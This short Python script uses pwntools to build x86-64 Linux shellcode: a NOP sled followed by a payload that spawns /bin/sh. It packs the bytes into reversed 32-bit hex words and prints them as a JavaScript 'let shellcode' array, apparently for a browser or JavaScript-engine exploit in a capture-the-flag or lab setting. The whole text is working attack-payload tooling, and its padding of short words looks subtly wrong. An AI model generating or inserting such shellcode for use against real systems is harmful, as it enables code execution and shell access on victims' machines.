from pwn import asm, context, shellcraft

context.arch = 'amd64'
context.os = 'linux'

shellcode = asm('nop') * 8
shellcode += asm(shellcraft.sh())

formatted_shellcode = [
    "0x" + shellcode[i:i+4][::-1].hex() for i in range(0, len(shellcode), 4)
]

formatted_shellcode = [
    code.ljust(10, '0') if len(code) < 10 else code for code in formatted_shellcode
]

print("let shellcode = [" + ", ".join(formatted_shellcode) + "];")
